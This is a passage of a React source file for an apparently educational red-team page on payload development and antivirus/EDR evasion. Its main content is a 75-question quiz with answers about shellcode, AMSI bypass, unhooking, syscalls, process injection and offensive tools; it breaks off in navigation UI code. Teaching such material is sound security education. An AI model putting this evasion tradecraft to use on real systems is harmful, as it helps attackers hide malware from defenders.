import {
  Box,
  Button,
  Typography,
  Paper,
  alpha,
  useTheme,
  Chip,
  Grid,
  List,
  ListItem,
  ListItemIcon,
  ListItemText,
  Table,
  TableBody,
  TableCell,
  TableContainer,
  TableHead,
  TableRow,
  Divider,
  Alert,
  AlertTitle,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Drawer,
  Fab,
  IconButton,
  LinearProgress,
  useMediaQuery,
  Avatar,
} from "@mui/material";
import { useState, useEffect } from "react";
import ArrowBackIcon from "@mui/icons-material/ArrowBack";
import { useNavigate, Link } from "react-router-dom";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
import BugReportIcon from "@mui/icons-material/BugReport";
import SecurityIcon from "@mui/icons-material/Security";
import WarningAmberIcon from "@mui/icons-material/WarningAmber";
import CheckCircleIcon from "@mui/icons-material/CheckCircle";
import CodeIcon from "@mui/icons-material/Code";
import MemoryIcon from "@mui/icons-material/Memory";
import VisibilityOffIcon from "@mui/icons-material/VisibilityOff";
import ShieldIcon from "@mui/icons-material/Shield";
import BuildIcon from "@mui/icons-material/Build";
import GavelIcon from "@mui/icons-material/Gavel";
import TerminalIcon from "@mui/icons-material/Terminal";
import StorageIcon from "@mui/icons-material/Storage";
import SpeedIcon from "@mui/icons-material/Speed";
import LayersIcon from "@mui/icons-material/Layers";
import LockOpenIcon from "@mui/icons-material/LockOpen";
import SettingsIcon from "@mui/icons-material/Settings";
import DataObjectIcon from "@mui/icons-material/DataObject";
import LearnPageLayout from "../components/LearnPageLayout";
import QuizSection, { QuizQuestion } from "../components/QuizSection";
import QuizIcon from "@mui/icons-material/Quiz";
import ListAltIcon from "@mui/icons-material/ListAlt";
import CloseIcon from "@mui/icons-material/Close";
import KeyboardArrowUpIcon from "@mui/icons-material/KeyboardArrowUp";
import PlayArrowIcon from "@mui/icons-material/PlayArrow";
import BlockIcon from "@mui/icons-material/Block";
import TuneIcon from "@mui/icons-material/Tune";
import AccountTreeIcon from "@mui/icons-material/AccountTree";
import SearchIcon from "@mui/icons-material/Search";
import RadarIcon from "@mui/icons-material/Radar";
import EngineeringIcon from "@mui/icons-material/Engineering";

// 75 Quiz Questions covering Payload Development & AV Evasion
const questionBank: QuizQuestion[] = [
  // Topic 1: AV/EDR Fundamentals (1-15)
  { id: 1, question: "What is the primary difference between AV and EDR?", options: ["AV is newer technology", "EDR provides behavior analysis and response capabilities", "AV is more expensive", "EDR only works on servers"], correctAnswer: 1, explanation: "EDR (Endpoint Detection & Response) goes beyond signature matching to provide behavioral analysis, threat hunting, and incident response capabilities.", topic: "AV/EDR Fundamentals" },
  { id: 2, question: "What is signature-based detection?", options: ["Detecting based on file size", "Matching known malware patterns/hashes", "Monitoring network traffic", "Analyzing user behavior"], correctAnswer: 1, explanation: "Signature-based detection identifies malware by matching files against a database of known malware signatures (hashes, byte patterns).", topic: "AV/EDR Fundamentals" },
  { id: 3, question: "What is heuristic analysis in antivirus?", options: ["Database lookup", "Analyzing code behavior and characteristics for suspicious patterns", "File compression", "Network monitoring"], correctAnswer: 1, explanation: "Heuristic analysis examines code characteristics and behavior patterns to identify potentially malicious files without requiring exact signatures.", topic: "AV/EDR Fundamentals" },
  { id: 4, question: "What is AMSI in Windows?", options: ["A memory scanner", "Antimalware Scan Interface - allows AV to scan scripts", "A firewall component", "An encryption standard"], correctAnswer: 1, explanation: "AMSI (Antimalware Scan Interface) is a Windows interface that allows applications to request malware scans, particularly for scripts and fileless malware.", topic: "AV/EDR Fundamentals" },
  { id: 5, question: "What is ETW in the context of EDR?", options: ["Encryption Technology for Windows", "Event Tracing for Windows - telemetry source", "Endpoint Threat Warning", "Enhanced Threat Watchdog"], correctAnswer: 1, explanation: "ETW (Event Tracing for Windows) is a kernel-level tracing facility that EDRs use to collect telemetry on system activities.", topic: "AV/EDR Fundamentals" },
  { id: 6, question: "What is API hooking used for in security products?", options: ["Performance optimization", "Intercepting function calls to monitor behavior", "Network routing", "Memory allocation"], correctAnswer: 1, explanation: "API hooking intercepts calls to Windows APIs, allowing security products to monitor and potentially block suspicious function calls.", topic: "AV/EDR Fundamentals" },
  { id: 7, question: "What is a 'sandbox' in malware analysis?", options: ["A beach simulation", "Isolated environment for safe malware execution", "A type of encryption", "Network segment"], correctAnswer: 1, explanation: "A sandbox is an isolated virtual environment where suspicious files can be executed safely to observe their behavior.", topic: "AV/EDR Fundamentals" },
  { id: 8, question: "What is 'static analysis' of malware?", options: ["Analyzing while running", "Examining code without execution", "Network traffic analysis", "Memory forensics"], correctAnswer: 1, explanation: "Static analysis examines malware's code, structure, and characteristics without actually running it.", topic: "AV/EDR Fundamentals" },
  { id: 9, question: "What is 'dynamic analysis' of malware?", options: ["Code review", "Observing behavior during execution", "Signature matching", "Hash comparison"], correctAnswer: 1, explanation: "Dynamic analysis observes malware behavior while it runs, typically in a sandbox environment.", topic: "AV/EDR Fundamentals" },
  { id: 10, question: "What does EDR telemetry typically include?", options: ["Only file hashes", "Process creation, network connections, file operations, registry changes", "Just login events", "Only antivirus alerts"], correctAnswer: 1, explanation: "EDR telemetry captures comprehensive system activity including process trees, network connections, file/registry operations, and more.", topic: "AV/EDR Fundamentals" },
  { id: 11, question: "What is 'behavioral detection'?", options: ["Signature matching", "Identifying malware by suspicious actions rather than signatures", "File size analysis", "Checksum verification"], correctAnswer: 1, explanation: "Behavioral detection identifies threats based on suspicious activities (like process injection, credential access) rather than file signatures.", topic: "AV/EDR Fundamentals" },
  { id: 12, question: "What is the Windows Defender 'cloud protection' feature?", options: ["Online backup", "Sending suspicious files to Microsoft for analysis", "Cloud storage scanning", "Remote administration"], correctAnswer: 1, explanation: "Cloud protection sends suspicious file metadata/samples to Microsoft's cloud for deeper analysis and faster signature updates.", topic: "AV/EDR Fundamentals" },
  { id: 13, question: "What is 'memory scanning' in AV?", options: ["Checking RAM prices", "Scanning process memory for malicious code", "Disk defragmentation", "Cache clearing"], correctAnswer: 1, explanation: "Memory scanning examines running process memory for malicious code, catching threats that only exist in memory.", topic: "AV/EDR Fundamentals" },
  { id: 14, question: "What is a 'fileless' attack?", options: ["Attack without the internet", "Malware that operates entirely in memory without files on disk", "Attack on empty directories", "Deleted file attack"], correctAnswer: 1, explanation: "Fileless attacks execute malicious code entirely in memory, avoiding traditional file-based detection.", topic: "AV/EDR Fundamentals" },
  { id: 15, question: "What is 'threat intelligence' in EDR context?", options: ["AI predictions", "Data about known threats, IOCs, and TTPs", "User training", "Hardware specs"], correctAnswer: 1, explanation: "Threat intelligence provides data about known threats, indicators of compromise (IOCs), and adversary tactics that EDRs use for detection.", topic: "AV/EDR Fundamentals" },

  // Topic 2: Shellcode Fundamentals (16-30)
  { id: 16, question: "What is shellcode?", options: ["A shell script", "Small, position-independent machine code for exploitation", "A database query", "A web framework"], correctAnswer: 1, explanation: "Shellcode is compact, position-independent machine code typically used as a payload in exploits.", topic: "Shellcode" },
  { id: 17, question: "Why must shellcode be position-independent?", options: ["For readability", "Because its memory location is unknown at runtime", "For compression", "For encryption"], correctAnswer: 1, explanation: "Shellcode must be position-independent (PIC) because it may be loaded at any memory address during exploitation.", topic: "Shellcode" },
  { id: 18, question: "What is a 'staged' payload?", options: ["A payload that waits", "Small initial payload that downloads larger second stage", "Pre-compiled payload", "Encrypted payload"], correctAnswer: 1, explanation: "Staged payloads use a small initial 'stager' to download and execute a larger second-stage payload.", topic: "Shellcode" },
  { id: 19, question: "What is a 'stageless' payload?", options: ["A broken payload", "Complete payload delivered in one piece", "Payload without shellcode", "Network-only payload"], correctAnswer: 1, explanation: "Stageless payloads contain all functionality in a single, self-contained payload without needing to download additional stages.", topic: "Shellcode" },
  { id: 20, question: "What is 'msfvenom' used for?", options: ["Virus creation", "Generating payloads and shellcode in Metasploit", "Network scanning", "Password cracking"], correctAnswer: 1, explanation: "msfvenom is Metasploit's payload generator that creates shellcode in various formats with optional encoding.", topic: "Shellcode" },
  { id: 21, question: "What is a 'reverse shell'?", options: ["A shell that's backwards", "Target connects back to attacker's listener", "Shell running in reverse order", "Encrypted shell"], correctAnswer: 1, explanation: "A reverse shell initiates an outbound connection from the target to the attacker, bypassing inbound firewall rules.", topic: "Shellcode" },
  { id: 22, question: "What is a 'bind shell'?", options: ["A shell tied to a process", "Target opens a port for attacker to connect to", "Shell with key bindings", "Compressed shell"], correctAnswer: 1, explanation: "A bind shell opens a listening port on the target, waiting for the attacker to connect inbound.", topic: "Shellcode" },
  { id: 23, question: "Why are null bytes problematic in shellcode?", options: ["They're too large", "They can terminate strings in C functions", "They cause encryption", "They're illegal"], correctAnswer: 1, explanation: "Null bytes (0x00) terminate C strings, potentially truncating shellcode when passed through string functions.", topic: "Shellcode" },
  { id: 24, question: "What is 'shellcode encoding'?", options: ["Adding comments", "Transforming shellcode to avoid bad characters/signatures", "Compiling shellcode", "Documenting shellcode"], correctAnswer: 1, explanation: "Encoding transforms shellcode bytes to avoid bad characters and evade simple signature detection.", topic: "Shellcode" },
  { id: 25, question: "What is the 'XOR encoder' commonly used for?", options: ["Compression", "Simple obfuscation by XORing bytes with a key", "Encryption", "Hashing"], correctAnswer: 1, explanation: "XOR encoding is a simple obfuscation that XORs each shellcode byte with a key, decoded at runtime.", topic: "Shellcode" },
  { id: 26, question: "What is 'PEB walking' in shellcode?", options: ["Memory leak", "Technique to find loaded DLLs and function addresses", "Process enumeration", "Thread injection"], correctAnswer: 1, explanation: "PEB walking traverses the Process Environment Block to locate loaded DLLs and resolve API function addresses dynamically.", topic: "Shellcode" },
  { id: 27, question: "What Windows structure contains loaded module information?", options: ["Registry", "PEB (Process Environment Block)", "SAM database", "Event log"], correctAnswer: 1, explanation: "The PEB contains the InMemoryOrderModuleList with information about all loaded DLLs in a process.", topic: "Shellcode" },
  { id: 28, question: "What is 'API hashing' in shellcode?", options: ["Encrypting API calls", "Using hashes instead of strings to find functions", "Hashing API responses", "API authentication"], correctAnswer: 1, explanation: "API hashing uses computed hashes to find function addresses, avoiding suspicious strings in shellcode.", topic: "Shellcode" },
  { id: 29, question: "What is a 'shellcode runner'?", options: ["A debugger", "Program that allocates memory and executes shellcode", "Antivirus tool", "Shell interpreter"], correctAnswer: 1, explanation: "A shellcode runner allocates executable memory, copies shellcode into it, and transfers execution to run the payload.", topic: "Shellcode" },
  { id: 30, question: "What memory protection must shellcode have to execute?", options: ["Read-only", "Execute permission (typically RWX or RX)", "No protection", "Write-only"], correctAnswer: 1, explanation: "Shellcode requires execute permission in its memory region, often achieved through VirtualAlloc with PAGE_EXECUTE_READWRITE.", topic: "Shellcode" },

  // Topic 3: Evasion Techniques (31-50)
  { id: 31, question: "What is 'obfuscation' in payload development?", options: ["Making code faster", "Making code harder to analyze while preserving function", "Removing code", "Optimizing code"], correctAnswer: 1, explanation: "Obfuscation transforms code to hinder analysis and evade detection while maintaining its original functionality.", topic: "Evasion" },
  { id: 32, question: "What is 'packing' a payload?", options: ["Zipping it", "Compressing/encrypting and adding unpacker stub", "Adding documentation", "Creating installer"], correctAnswer: 1, explanation: "Packing compresses and/or encrypts a payload with an unpacker stub that restores it at runtime.", topic: "Evasion" },
  { id: 33, question: "What is 'process injection'?", options: ["SQL injection", "Executing code in another process's memory space", "Starting processes", "Process termination"], correctAnswer: 1, explanation: "Process injection executes malicious code within another legitimate process's address space to evade detection.", topic: "Evasion" },
  { id: 34, question: "What is 'DLL injection'?", options: ["Database injection", "Forcing a process to load a malicious DLL", "DLL compilation", "Library management"], correctAnswer: 1, explanation: "DLL injection forces a target process to load an attacker-controlled DLL, executing malicious code in that process context.", topic: "Evasion" },
  { id: 35, question: "What is 'process hollowing'?", options: ["Memory leak", "Replacing legitimate process code with malicious code", "Process termination", "Creating empty processes"], correctAnswer: 1, explanation: "Process hollowing creates a suspended legitimate process, unmaps its code, and replaces it with malicious code before resuming.", topic: "Evasion" },
  { id: 36, question: "What is 'thread hijacking'?", options: ["Process termination", "Redirecting existing thread to execute malicious code", "Creating threads", "Thread pooling"], correctAnswer: 1, explanation: "Thread hijacking suspends an existing thread, modifies its context to point to malicious code, and resumes it.", topic: "Evasion" },
  { id: 37, question: "What is 'APC injection'?", options: ["API calling", "Using Asynchronous Procedure Calls to queue code execution", "Process creation", "Memory allocation"], correctAnswer: 1, explanation: "APC injection queues malicious code as an Asynchronous Procedure Call to execute in the target thread's context.", topic: "Evasion" },
  { id: 38, question: "What is an AMSI bypass?", options: ["Firewall evasion", "Technique to prevent AMSI from scanning malicious content", "Network bypass", "Authentication bypass"], correctAnswer: 1, explanation: "AMSI bypass techniques disable or evade the Antimalware Scan Interface to execute malicious scripts undetected.", topic: "Evasion" },
  { id: 39, question: "What is 'unhooking' in evasion?", options: ["Removing hooks from code", "Restoring original API functions to bypass EDR hooks", "Code commenting", "Memory cleanup"], correctAnswer: 1, explanation: "Unhooking restores original ntdll.dll functions from disk, removing EDR-placed hooks that monitor API calls.", topic: "Evasion" },
  { id: 40, question: "What are 'direct syscalls'?", options: ["API calls", "Calling kernel functions directly, bypassing user-mode hooks", "System configuration", "Direct database access"], correctAnswer: 1, explanation: "Direct syscalls invoke kernel functions directly using syscall instruction, bypassing user-mode API hooks.", topic: "Evasion" },
  { id: 41, question: "What is 'indirect syscalls'?", options: ["Slow syscalls", "Jumping to syscall instruction in ntdll to appear legitimate", "Encrypted syscalls", "Remote syscalls"], correctAnswer: 1, explanation: "Indirect syscalls jump to the syscall instruction within ntdll.dll, making the call appear to originate from legitimate code.", topic: "Evasion" },
  { id: 42, question: "What is 'sleep obfuscation'?", options: ["Sleep function removal", "Encrypting payload in memory during sleep periods", "Delayed execution", "Sleep command evasion"], correctAnswer: 1, explanation: "Sleep obfuscation encrypts the payload in memory during sleep intervals, evading memory scanners.", topic: "Evasion" },
  { id: 43, question: "What is 'stack spoofing'?", options: ["Memory overflow", "Manipulating call stack to appear legitimate", "Stack allocation", "Stack compression"], correctAnswer: 1, explanation: "Stack spoofing creates fake call stacks that appear to originate from legitimate system functions.", topic: "Evasion" },
  { id: 44, question: "What is 'module stomping'?", options: ["Module deletion", "Overwriting legitimate DLL memory with malicious code", "Module loading", "DLL signing"], correctAnswer: 1, explanation: "Module stomping overwrites the memory of a loaded legitimate DLL with malicious code, hiding in plain sight.", topic: "Evasion" },
  { id: 45, question: "What is 'string obfuscation'?", options: ["Text formatting", "Hiding suspicious strings through encoding/encryption", "String compression", "Character replacement"], correctAnswer: 1, explanation: "String obfuscation hides suspicious strings (URLs, commands) through encoding, encryption, or runtime construction.", topic: "Evasion" },
  { id: 46, question: "What is 'timestomping'?", options: ["Time synchronization", "Modifying file timestamps to blend in", "Performance measurement", "Scheduling"], correctAnswer: 1, explanation: "Timestomping modifies file creation/modification times to make malicious files appear older or match legitimate files.", topic: "Evasion" },
  { id: 47, question: "What is 'sandbox detection'?", options: ["Finding sandboxes", "Identifying if running in analysis environment to change behavior", "Sandbox creation", "Container detection"], correctAnswer: 1, explanation: "Sandbox detection identifies analysis environments (VMs, sandboxes) to exit or behave benignly when detected.", topic: "Evasion" },
  { id: 48, question: "What is 'entropy analysis' used to detect?", options: ["File size", "Packed/encrypted payloads via randomness measurement", "File type", "Creation date"], correctAnswer: 1, explanation: "Entropy analysis measures data randomness - high entropy suggests encryption or packing, flagging suspicious files.", topic: "Evasion" },
  { id: 49, question: "What is a 'crypter'?", options: ["Cryptocurrency tool", "Tool that encrypts payloads to evade AV", "Password manager", "File shredder"], correctAnswer: 1, explanation: "A crypter encrypts malicious payloads with a stub that decrypts them at runtime, evading signature detection.", topic: "Evasion" },
  { id: 50, question: "What is 'metamorphic' malware?", options: ["Malware that transforms", "Malware that rewrites its own code while maintaining function", "Shapeshifting UI", "Cross-platform malware"], correctAnswer: 1, explanation: "Metamorphic malware completely rewrites its code each time it propagates while maintaining functionality.", topic: "Evasion" },

  // Topic 4: Process Injection Techniques (51-65)
  { id: 51, question: "What Windows API is commonly used to allocate remote memory?", options: ["malloc()", "VirtualAllocEx()", "HeapAlloc()", "GlobalAlloc()"], correctAnswer: 1, explanation: "VirtualAllocEx() allocates memory in a remote process's address space, essential for process injection.", topic: "Process Injection" },
  { id: 52, question: "What API writes data to another process's memory?", options: ["WriteFile()", "WriteProcessMemory()", "memcpy()", "fwrite()"], correctAnswer: 1, explanation: "WriteProcessMemory() writes data into another process's memory space.", topic: "Process Injection" },
  { id: 53, question: "What is 'CreateRemoteThread' injection?", options: ["Thread pooling", "Creating a thread in remote process to execute code", "Thread synchronization", "Thread termination"], correctAnswer: 1, explanation: "CreateRemoteThread creates a new thread in a target process that executes the injected code.", topic: "Process Injection" },
  { id: 54, question: "What is 'NtCreateThreadEx' compared to CreateRemoteThread?", options: ["Slower", "Lower-level native API, less monitored", "Deprecated", "User-mode only"], correctAnswer: 1, explanation: "NtCreateThreadEx is the underlying native API, potentially less monitored than the higher-level CreateRemoteThread.", topic: "Process Injection" },
  { id: 55, question: "What is 'Early Bird' injection?", options: ["Morning attack", "Injecting into process before AV hooks are placed", "Quick injection", "Automated injection"], correctAnswer: 1, explanation: "Early Bird injection targets processes in suspended state before EDR hooks are initialized.", topic: "Process Injection" },
  { id: 56, question: "What is 'AtomBombing'?", options: ["Explosive payload", "Using atom tables for code injection", "Nuclear simulation", "Atom processing"], correctAnswer: 1, explanation: "AtomBombing abuses Windows atom tables to write code into target processes without typical injection APIs.", topic: "Process Injection" },
  { id: 57, question: "What process is commonly targeted for injection due to trust?", options: ["calc.exe", "explorer.exe or svchost.exe", "notepad.exe", "cmd.exe"], correctAnswer: 1, explanation: "explorer.exe and svchost.exe are often targeted because they're always running and expected to have network activity.", topic: "Process Injection" },
  { id: 58, question: "What is 'reflective DLL injection'?", options: ["Mirror injection", "DLL loads itself into memory without LoadLibrary", "DLL copying", "Reverse injection"], correctAnswer: 1, explanation: "Reflective DLL injection allows a DLL to load itself into memory, avoiding LoadLibrary API monitoring.", topic: "Process Injection" },
  { id: 59, question: "What is 'Process Doppelgänging'?", options: ["Process cloning", "Using NTFS transactions to create processes from transacted files", "Process duplication", "Twin processes"], correctAnswer: 1, explanation: "Process Doppelgänging uses NTFS transactions to create a process from a transacted (invisible) malicious file.", topic: "Process Injection" },
  { id: 60, question: "What is 'Process Herpaderping'?", options: ["Memory corruption", "Modifying file content after mapping but before scan", "Process injection", "File injection"], correctAnswer: 1, explanation: "Process Herpaderping modifies file content after it's mapped into memory but before AV scans the file.", topic: "Process Injection" },
  { id: 61, question: "What is a 'callback' injection technique?", options: ["Phone injection", "Using Windows callback mechanisms to execute code", "Reverse call injection", "API hooking"], correctAnswer: 1, explanation: "Callback injection uses Windows callback mechanisms (like EnumWindows) to execute injected code.", topic: "Process Injection" },
  { id: 62, question: "What is 'mapping injection'?", options: ["GPS injection", "Using memory-mapped files for cross-process code execution", "Address injection", "Coordinate injection"], correctAnswer: 1, explanation: "Mapping injection uses shared memory sections (mapped files) to transfer and execute code across processes.", topic: "Process Injection" },
  { id: 63, question: "What is 'ghostwriting'?", options: ["Writing ghost stories", "Modifying target's memory through page permissions", "Invisible code", "Deleted file execution"], correctAnswer: 1, explanation: "Ghostwriting uses memory permission tricks to write code without using WriteProcessMemory.", topic: "Process Injection" },
  { id: 64, question: "What is 'transacted hollowing'?", options: ["Transaction processing", "Process hollowing using NTFS transactions", "Hollow transactions", "Banking attack"], correctAnswer: 1, explanation: "Transacted hollowing combines process hollowing with NTFS transactions to evade file-based detection.", topic: "Process Injection" },
  { id: 65, question: "Why is 'svchost.exe' a popular injection target?", options: ["It's small", "Many instances run legitimately with network activity", "It's easy to find", "It has no security"], correctAnswer: 1, explanation: "Multiple svchost.exe processes run legitimately with various network/system activities, making injected ones blend in.", topic: "Process Injection" },

  // Topic 5: Tools & Tradecraft (66-75)
  { id: 66, question: "What is Cobalt Strike's 'Artifact Kit'?", options: ["Art collection", "Customizable payload generation templates", "Artifact scanner", "File generator"], correctAnswer: 1, explanation: "Artifact Kit provides source code templates for customizing Cobalt Strike payload generation to evade detection.", topic: "Tools & Tradecraft" },
  { id: 67, question: "What is 'Donut'?", options: ["Food item", "Tool that converts executables to position-independent shellcode", "Encryption tool", "Packer"], correctAnswer: 1, explanation: "Donut converts .NET assemblies and native executables into position-independent shellcode.", topic: "Tools & Tradecraft" },
  { id: 68, question: "What is 'ScareCrow'?", options: ["Farm equipment", "EDR evasion payload generator", "AV scanner", "Threat simulation"], correctAnswer: 1, explanation: "ScareCrow is a payload generator focused on EDR evasion through various techniques.", topic: "Tools & Tradecraft" },
  { id: 69, question: "What is 'BOF' in Cobalt Strike?", options: ["Beginning of File", "Beacon Object File - small C programs for Beacon", "Binary Output Format", "Beacon Offset"], correctAnswer: 1, explanation: "BOFs are small C programs that run inside Beacon's memory, avoiding fork-and-run detection.", topic: "Tools & Tradecraft" },
  { id: 70, question: "What is 'Nim' used for in offensive security?", options: ["Game development", "Writing evasive loaders due to uncommon language", "Database queries", "Web development"], correctAnswer: 1, explanation: "Nim is used for payload development because compiled binaries have different signatures than C/C# and existing detections.", topic: "Tools & Tradecraft" },
  { id: 71, question: "What is 'syscall stub' generation?", options: ["API documentation", "Creating code that makes direct syscalls", "Stub files", "System calls list"], correctAnswer: 1, explanation: "Syscall stub generators create assembly code for making direct/indirect syscalls to bypass API hooks.", topic: "Tools & Tradecraft" },
  { id: 72, question: "What is 'OPSEC' in payload development?", options: ["Operations security - minimizing detection footprint", "Operational specifications", "Open security", "Optional security"], correctAnswer: 0, explanation: "OPSEC (Operational Security) means minimizing indicators that could reveal the operation or operator.", topic: "Tools & Tradecraft" },
  { id: 73, question: "What is 'Malleable C2' in Cobalt Strike?", options: ["Flexible server", "Customizable network traffic profiles", "Scalable infrastructure", "Dynamic endpoints"], correctAnswer: 1, explanation: "Malleable C2 profiles customize Beacon's network traffic to mimic legitimate applications or blend with normal traffic.", topic: "Tools & Tradecraft" },
  { id: 74, question: "What is a 'sleep mask' in Cobalt Strike?", options: ["Bedtime routine", "Code that encrypts Beacon in memory during sleep", "Timing function", "Process hider"], correctAnswer: 1, explanation: "Sleep masks encrypt Beacon's memory during sleep callbacks, evading memory scanners.", topic: "Tools & Tradecraft" },
  { id: 75, question: "What is 'PPID spoofing'?", options: ["PID modification", "Faking parent process ID to appear legitimate", "Process ID generation", "Parent detection"], correctAnswer: 1, explanation: "PPID spoofing sets a fake parent process ID, making a malicious process appear to be spawned by a legitimate parent.", topic: "Tools & Tradecraft" },
];

export default function PayloadDevelopmentGuidePage() {
  const navigate = useNavigate();
  const theme = useTheme();
  const isMobile = useMediaQuery(theme.breakpoints.down("md"));
  const isLargeScreen = useMediaQuery(theme.breakpoints.up("lg"));

  const accent = "#dc2626";
  const accentDark = "#b91c1c";

  const pageContext = `Payload Development & AV Evasion guide for red team operations. Covers shellcode fundamentals, process injection techniques, AMSI bypass, EDR evasion, obfuscation, direct syscalls, and offensive tool tradecraft. Educational content for authorized security testing.`;

  const [navDrawerOpen, setNavDrawerOpen] = useState(false);
  const [activeSection, setActiveSection] = useState<string>("");

  const moduleNavItems = [
    { id: "introduction", label: "Introduction", icon: "🎯" },
    { id: "av-edr-basics", label: "AV/EDR Basics", icon: "🛡️" },
    { id: "detection-methods", label: "Detection Methods", icon: "🔍" },
    { id: "shellcode-fundamentals", label: "Shellcode Basics", icon: "💻" },
    { id: "payload-types", label: "Payload Types", icon: "📦" },
    { id: "obfuscation", label: "Obfuscation", icon: "🎭" },
    { id: "process-injection", label: "Process Injection", icon: "💉" },
    { id: "amsi-bypass", label: "AMSI Bypass", icon: "🔓" },
    { id: "edr-evasion", label: "EDR Evasion", icon: "👻" },
    { id: "syscalls", label: "Direct Syscalls", icon: "⚡" },
    { id: "tools", label: "Tools & Frameworks", icon: "🛠️" },
    { id: "opsec", label: "OPSEC", icon: "🕵️" },
    { id: "ethics", label: "Ethics & Legal", icon: "⚖️" },
    { id: "quiz-section", label: "Quiz", icon: "❓" },
  ];

  const scrollToSection = (sectionId: string) => {
    const element = document.getElementById(sectionId);
    if (element) {
      element.scrollIntoView({ behavior: "smooth", block: "start" });
      setNavDrawerOpen(false);
    }
  };

  useEffect(() => {
    const handleScroll = () => {
      const sections = moduleNavItems.map(item => item.id);
      let currentSection = "";
      for (const sectionId of sections) {
        const element = document.getElementById(sectionId);
        if (element) {
          const rect = element.getBoundingClientRect();
          if (rect.top <= 150) {
            currentSection = sectionId;
          }
        }
      }
      setActiveSection(currentSection);
    };

    window.addEventListener("scroll", handleScroll);
    handleScroll();
    return () => window.removeEventListener("scroll", handleScroll);
  }, []);

  const scrollToTop = () => window.scrollTo({ top: 0, behavior: "smooth" });

  const currentIndex = moduleNavItems.findIndex(item => item.id === activeSection);
  const progressPercent = currentIndex >= 0 ? ((currentIndex + 1) / moduleNavItems.length) * 100 : 0;

  // Sidebar Navigation
  const sidebarNav = (
    <Paper
      elevation={0}
      sx={{
        width: 220,
        flexShrink: 0,
        position: "sticky",
        top: 80,
        maxHeight: "calc(100vh - 100px)",
        overflowY: "auto",
        borderRadius: 3,
        border: `1px solid ${alpha(accent, 0.15)}`,
        bgcolor: alpha(theme.palette.background.paper, 0.6),
        display: { xs: "none", lg: "block" },
        "&::-webkit-scrollbar": { width: 6 },
        "&::-webkit-scrollbar-thumb": { bgcolor: alpha(accent, 0.3), borderRadius: 3 },
      }}
    >
      <Box sx={{ p: 2 }}>
        <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: accent, display: "flex", alignItems: "center", gap: 1 }}>
          <ListAltIcon sx={{ fontSize: 18 }} />
          Course Navigation
        </Typography>
        <Box sx={{ mb: 2 }}>
          <Box sx={{ display: "flex", justifyContent: "space-between", mb: 0.5 }}>
            <Typography variant="caption" color="text.secondary">Progress</Typography>
            <Typography variant="caption" sx={{ fontWeight: 600, color: accent }}>{Math.round(progressPercent)}%</Typography>
          </Box>
          <LinearProgress
            variant="determinate"
            value={progressPercent}
            sx={{
              height: 6,
              borderRadius: 3,
              bgcolor: alpha(accent, 0.1),
              "& .MuiLinearProgress-bar": { bgcolor: accent, borderRadius: 3 },
            }}
          />
        </Box>
        <Divider sx={{ mb: 1 }} />
        <List dense sx={{ mx: -1 }}>
          {moduleNavItems.map((item) => (
            <ListItem
              key={item.id}
              onClick={() => scrollToSection(item.id)}
              sx={{
                borderRadius: 1.5,
                mb: 0.25,
                py: 0.5,
                cursor: "pointer",
                bgcolor: activeSection === item.id ? alpha(accent, 0.15) : "transparent",
                borderLeft: activeSection === item.id ? `3px solid ${accent}` : "3px solid transparent",
                "&:hover": { bgcolor: alpha(accent, 0.08) },
                transition: "all 0.15s ease",
              }}
            >
              <ListItemIcon sx={{ minWidth: 24, fontSize: "0.9rem" }}>{item.icon}</ListItemIcon>
              <ListItemText
                primary={
                  <Typography
                    variant="caption"
                    sx={{
                      fontWeight: activeSection === item.id ? 700 : 500,
                      color: activeSection === item.id ? accent : "text.secondary",
                      fontSize: "0.75rem",
                    }}
                  >
                    {item.label}
                  </Typography>
                }
              />
            </ListItem>
          ))}
        </List>
      </Box>
    </Paper>
  );

  return (
    <LearnPageLayout pageTitle="Payload Development & AV Evasion" pageContext={pageContext}>
      {/* Mobile FABs */}
      <Fab
        color="primary"
        onClick={() => setNavDrawerOpen(true)}
        sx={{
          position: "fixed",
          bottom: 90,
          right: 24,
          zIndex: 1000,
          bgcolor: accent,
          "&:hover": { bgcolor: accentDark },
          boxShadow: `0 4px 20px ${alpha(accent, 0.4)}`,
          display: { xs: "flex", lg: "none" },
        }}
      >
        <ListAltIcon />
      </Fab>

      <Fab
        size="small"
        onClick={scrollToTop}
        sx={{
          position: "fixed",
          bottom: 32,
          right: 28,
          zIndex: 1000,
          bgcolor: alpha(accent, 0.15),
          color: accent,
          "&:hover": { bgcolor: alpha(accent, 0.25) },
          display: { xs: "flex", lg: "none" },
        }}
      >
        <KeyboardArrowUpIcon />
      </Fab>

      {/* Mobile Navigation Drawer */}
      <Drawer
        anchor="right"
        open={navDrawerOpen}
        onClose={() => setNavDrawerOpen(false)}
        PaperProps={{
          sx: { width: isMobile ? "85%" : 320, bgcolor: theme.palette.background.paper, backgroundImage: "none" },
        }}
      >
        <Box sx={{ p: 2 }}>
          <Box sx={{ display: "flex", alignItems: "center", justifyContent: "space-between", mb: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, display: "flex", alignItems: "center", gap: 1 }}>
              <ListAltIcon sx={{ color: accent }} />
              Course Navigation
            </Typography>
            <IconButton onClick={() => setNavDrawerOpen(false)} size="small">
              <CloseIcon />
            </IconButton>
          </Box>
          <Divider sx={{ mb: 2 }} />
          <Box sx={{ mb: 2, p: 1.5, borderRadius: 2, bgcolor: alpha(accent, 0.05) }}>
            <Box sx={{ display: "flex", justifyContent: "space-between", mb: 0.5 }}>
              <Typography variant="caption" color="text.secondary">Progress</Typography>
              <Typography variant="caption" sx={{ fontWeight: 600, color: accent }}>{Math.round(progressPercent)}%</Typography>
            </Box>
            <LinearProgress
              variant="determinate"
              value={progressPercent}
              sx={{
                height: 6,
                borderRadius: 3,
                bgcolor: alpha(accent, 0.1),
                "& .MuiLinearProgress-bar": { bgcolor: accent, borderRadius: 3 },
              }}
            />
          </Box>
          <List dense sx={{ mx: -1 }}>
            {moduleNavItems.map((item) => (
              <ListItem
                key={item.id}
                onClick={() => scrollToSection(item.id)}
                sx={{
                  borderRadius: 2,
                  mb: 0.5,
                  cursor: "pointer",
                  bgcolor: activeSection === item.id ? alpha(accent, 0.15) : "transparent",
                  borderLeft: activeSection === item.id ? `3px solid ${accent}` : "3px solid transparent",
                  "&:hover": { bgcolor: alpha(accent, 0.1) },
                  transition: "all 0.2s ease",
                }}
              >
                <ListItemIcon sx={{ minWidth: 32, fontSize: "1.1rem" }}>{item.icon}</ListItemIcon>
                <ListItemText
                  primary={
